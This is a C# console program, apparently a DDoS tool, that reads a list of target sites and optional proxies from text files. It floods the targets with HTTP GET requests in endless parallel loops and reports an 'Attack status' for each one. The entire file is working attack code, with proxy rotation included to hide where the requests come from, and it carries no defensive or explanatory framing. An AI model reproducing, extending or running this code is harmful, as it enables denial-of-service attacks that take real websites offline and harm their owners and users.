using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

namespace NOWARASPNET
{
    internal class Program
    {
        private const int defaultThreads = 100;
        
        static void Main(string[] args)
        {
            Logger _logger = new Logger();
            try
            {
                MainAsync(_logger).GetAwaiter().GetResult();
            }
            catch (Exception ex)
            {
                _logger.LogData(ex.ToString());
            }
        }


        static async Task MainAsync(Logger logger)
        {
            //Test Connection with Proxy
            /*Request request = new Request("91.202.240.208:51678");
            await request.Get("https://api.ipify.org");*/
            

            Console.Write("Enter the number of threads (default 100): ");
            string input = Console.ReadLine();

            int _threads = defaultThreads;
            int.TryParse(input, out _threads);
            if (_threads == 0)
            {
                _threads = defaultThreads;
            }

            Console.Write("Do you wan't to use proxy? (1 - yes; 0 - no): ");
            input = Console.ReadLine();
            int _res = 0;
            int.TryParse(input, out _res);

            Console.WriteLine($"Number of threads set to: {_threads}");


            
            while (true)
            {
                try
                {
                    await RunDDOS(_res, _threads);
                }
                catch (Exception ex)
                {
                    logger.LogData(ex.ToString());
                }
            }
        }

        static async Task RunDDOS(int res, int threads)
        {
            string[] sites = File.ReadAllLines(Environment.CurrentDirectory.ToString() + "\\sites.txt");

            if (res == 1)
            {
                Request request;
                Random random = new Random();
                string[] proxys = File.ReadAllLines(Environment.CurrentDirectory.ToString() + "\\proxy.txt");

                Console.WriteLine($"Work with Proxy servers! \nTotal Proxys: {proxys.Length}");

                while (true)
                {
                    await Task.Run(() => Parallel.ForEach(sites, new ParallelOptions { MaxDegreeOfParallelism = threads }, site =>
                    {
                        request = new Request(proxys[random.Next(0, proxys.Length - 1)]);
                        request.Get(site);
                    }));
                }
            }
            else
            {
                Request request = new Request();
                Console.WriteLine("Work without Proxy servers!");
                while (true)
                {
                    await Task.Run(() => Parallel.ForEach(sites, new ParallelOptions { MaxDegreeOfParallelism = threads }, site =>
                    {
                        request.Get(site);
                    }));
                }
            }
        }
    }

    class Request
    {
        private readonly HttpClient _httpClient;
        private HttpClientHandler _httpClientHandler;
        private string _proxy;
        public Request()
        {
            _httpClient = new HttpClient();
        }

        public Request(string proxy)
        {
            _httpClientHandler = new HttpClientHandler { UseProxy = true };
            _proxy = proxy;
            _httpClientHandler.Proxy = new WebProxy(_proxy);
            _httpClient = new HttpClient(_httpClientHandler);
        }

        public async void Get(string url)
        {
            try
            {
                HttpResponseMessage response = await _httpClient.GetAsync(url);
                Console.WriteLine($"Site: {url}; Attack status: {response.StatusCode}; IP: {_proxy}");

                //var contents = await response.Content.ReadAsStringAsync();
                //Console.WriteLine(contents);
            }
            catch
            {
                Console.WriteLine($"Site: {url}; Attack status: connection refused!");
            }
        }
    }


    class Logger
    {

        public void LogData(string data)
        {
            try
            {
                string path = Directory.GetCurrentDirectory() + @"\program.log";
                FileStream fileStream = File.Open(path, File.Exists(path) ? FileMode.Append : FileMode.OpenOrCreate, FileAccess.Write, FileShare.ReadWrite);

                using (StreamWriter fs = new StreamWriter(fileStream))
                {
                    fs.WriteLine(data);
                };
                fileStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }

    }

}


